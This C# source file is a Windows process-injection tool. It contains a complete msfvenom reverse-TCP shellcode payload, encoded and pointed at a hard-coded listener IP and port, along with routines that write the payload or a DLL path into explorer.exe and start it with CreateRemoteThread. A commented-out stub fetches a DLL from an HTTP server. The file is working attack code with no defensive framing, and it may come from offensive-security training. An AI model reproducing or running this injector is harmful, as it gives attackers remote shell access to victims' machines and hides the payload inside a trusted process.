using System.Diagnostics;
using System;
using System.Runtime.InteropServices;

namespace cevsn
{
    public class Privsn
    {
        /*
            Shellcode with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.68.131 LPORT=1331 -e x64/zutto_dekiru -f csharp -o test.cs
        */
        byte[] buf = new byte[514] {
        0xda,0xc4,0x4d,0x31,0xff,0x41,0xb7,0x3a,0x48,0x89,0xe1,0x48,0xbf,0xc9,0x05,
        0x40,0x68,0x0a,0x29,0x50,0xd2,0x66,0x81,0xe1,0x60,0xfa,0x48,0x0f,0xae,0x01,
        0x48,0x83,0xc1,0x08,0x4c,0x8b,0x29,0x49,0xff,0xcf,0x4b,0x31,0x7c,0xfd,0x32,
        0x4d,0x85,0xff,0x75,0xf3,0x35,0x4d,0xc3,0x8c,0xfa,0xc1,0x90,0xd2,0xc9,0x05,
        0x01,0x39,0x4b,0x79,0x02,0x83,0x9f,0x4d,0x71,0xba,0x6f,0x61,0xdb,0x80,0xa9,
        0x4d,0xcb,0x3a,0x12,0x61,0xdb,0x80,0xe9,0x4d,0xcb,0x1a,0x5a,0x61,0x5f,0x65,
        0x83,0x4f,0x0d,0x59,0xc3,0x61,0x61,0x12,0x65,0x39,0x21,0x14,0x08,0x05,0x70,
        0x93,0x08,0xcc,0x4d,0x29,0x0b,0xe8,0xb2,0x3f,0x9b,0x44,0x11,0x20,0x81,0x7b,
        0x70,0x59,0x8b,0x39,0x08,0x69,0xda,0xa2,0xd0,0x5a,0xc9,0x05,0x40,0x20,0x8f,
        0xe9,0x24,0xb5,0x81,0x04,0x90,0x38,0x81,0x61,0x48,0x96,0x42,0x45,0x60,0x21,
        0x0b,0xf9,0xb3,0x84,0x81,0xfa,0x89,0x29,0x81,0x1d,0xd8,0x9a,0xc8,0xd3,0x0d,
        0x59,0xc3,0x61,0x61,0x12,0x65,0x44,0x81,0xa1,0x07,0x68,0x51,0x13,0xf1,0xe5,
        0x35,0x99,0x46,0x2a,0x1c,0xf6,0xc1,0x40,0x79,0xb9,0x7f,0xf1,0x08,0x96,0x42,
        0x45,0x64,0x21,0x0b,0xf9,0x36,0x93,0x42,0x09,0x08,0x2c,0x81,0x69,0x4c,0x9b,
        0xc8,0xd5,0x01,0xe3,0x0e,0xa1,0x18,0xd3,0x19,0x44,0x18,0x29,0x52,0x77,0x09,
        0x88,0x88,0x5d,0x01,0x31,0x4b,0x73,0x18,0x51,0x25,0x25,0x01,0x3a,0xf5,0xc9,
        0x08,0x93,0x90,0x5f,0x08,0xe3,0x18,0xc0,0x07,0x2d,0x36,0xfa,0x1d,0x21,0xb4,
        0x5e,0x23,0xe0,0x96,0x36,0x72,0x68,0x0a,0x68,0x06,0x9b,0x40,0xe3,0x08,0xe9,
        0xe6,0x89,0x51,0xd2,0xc9,0x4c,0xc9,0x8d,0x43,0x95,0x52,0xd2,0xcc,0x36,0x80,
        0xc0,0x4e,0xaa,0x11,0x86,0x80,0x8c,0xa4,0x24,0x83,0xd8,0x11,0x68,0x85,0x72,
        0x66,0x6f,0xf5,0xfc,0x1c,0x5b,0x23,0x6d,0x41,0x69,0x0a,0x29,0x09,0x93,0x73,
        0x2c,0xc0,0x03,0x0a,0xd6,0x85,0x82,0x99,0x48,0x71,0xa1,0x47,0x18,0x90,0x9a,
        0x36,0xc5,0x08,0xe1,0xc8,0x61,0xaf,0x12,0x81,0x8c,0x81,0x29,0xb0,0xc3,0x5f,
        0x0d,0x29,0xfa,0x95,0x20,0x83,0xee,0x3a,0xc2,0x88,0x5d,0x0c,0xe1,0xe8,0x61,
        0xd9,0x2b,0x88,0xbf,0xd9,0xcd,0x7e,0x48,0xaf,0x07,0x81,0x84,0x84,0x28,0x08,
        0x29,0x50,0x9b,0x71,0x66,0x2d,0x0c,0x0a,0x29,0x50,0xd2,0xc9,0x44,0x10,0x29,
        0x5a,0x61,0xd9,0x30,0x9e,0x52,0x17,0x25,0x3b,0xe9,0x3a,0xdf,0x90,0x44,0x10,
        0x8a,0xf6,0x4f,0x97,0x96,0xed,0x51,0x41,0x69,0x42,0xa4,0x14,0xf6,0xd1,0xc3,
        0x40,0x00,0x42,0xa0,0xb6,0x84,0x99,0x44,0x10,0x29,0x5a,0x68,0x00,0x9b,0x36,
        0xc5,0x01,0x38,0x43,0xd6,0x98,0x9f,0x40,0xc4,0x0c,0xe1,0xcb,0x68,0xea,0xab,
        0x05,0x3a,0xc6,0x97,0xdf,0x61,0x61,0x00,0x81,0xfa,0x8a,0xe3,0x04,0x68,0xea,
        0xda,0x4e,0x18,0x20,0x97,0xdf,0x92,0xa0,0x67,0x6b,0x53,0x01,0xd2,0xac,0xbc,
        0xed,0x4f,0x36,0xd0,0x08,0xeb,0xce,0x01,0x6c,0xd4,0xb5,0x0f,0xc0,0x93,0xea,
        0x5c,0x55,0x69,0x8e,0x16,0x32,0x07,0x60,0x29,0x09,0x93,0x40,0xdf,0xbf,0xbd,
        0x0e,0xb2,0x5b,0x27 };

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess, //Access rights (dwDesiredAccess)
            bool bInheritHandle, //Inherited return handler
            uint processId //Process Identifier
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, //process handle to explorer.exe
            IntPtr lpAddress, //desired address of the alloc in the remote process -> new buffer will be allocated with starting addr from here
            //These 3 mirror VirtualAllocEx API params and specify and specify:
            uint dwSize, //Size of desired allocation               
            uint flAllocationType, //Allocation Type
            uint flProtect //Memory Protections
        ); 

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress,
            byte[] lpBuffer, 
            Int32 nSize, 
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, //Process

            //Set these to 0 to accept default values
            IntPtr lpThreadAttributes, //Security descriptor
            uint dwStackSize, //stack size

            IntPtr lpStartAddress, //Starting address of the Thread (equal to address of buffer with allocated and copied shellcode inside explorer.exe)
            IntPtr lpParameter, //Pointer to variables which will be passed to the thread function pointed to by lpStartAddress (no params in shellcode = NULL)
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        //Charset ASCII = LoadLibraryA, Unicode = LoadLibraryW
        [DllImport("kernel32.dll", SetLastError=true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(   

            [MarshalAs(UnmanagedType.LPStr)]
                string lpFileName
        );
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(
            IntPtr hModule, 
            string procName
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] 
        public static extern IntPtr GetModuleHandle(
            string lpModuleName
        );

        public Privsn()
        {
            //injectShellcode();
            injectDLL();
        }

        public void injectShellcode()
        {
            //Open Channel from this process to explorer.exe with
            //Access (all Access), Inherit (false), ProcID von explorer.exe
            //IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
            Process[] expProc = Process.GetProcessesByName("explorer");
            uint pid = Convert.ToUInt32(expProc[0].Id);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //Allocalte virtaul mem
            //0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE)
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            //Shellcode to inject
            byte[] shellcode = buf;
            
            IntPtr outSize;
            //Inject shellcode into explorer.exe
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            //Create Thread with injected Shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        public void injectDLL()
        {
            //Todo: Get dll from Webserver
            //create httpclient to download cevsn.dll from http server
            //HttpClient client = new HttpClient();
            //client.GetByteArrayAsync("http://localhost:8080/cevsn.dll");
            //byte[] dll = client.GetByteArrayAsync("http://localhost:8080/cevsn.dll").Result;


            String dir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            String dllName = dir + "\\Devsn.dll";

            Process[] expProc = Process.GetProcessesByName("explorer");
            uint pid = Convert.ToUInt32(expProc[0].Id);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, System.Text.Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            //Locate address
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }

        public void injectDLLReflective()
        {
            //TODO
        }
    }
}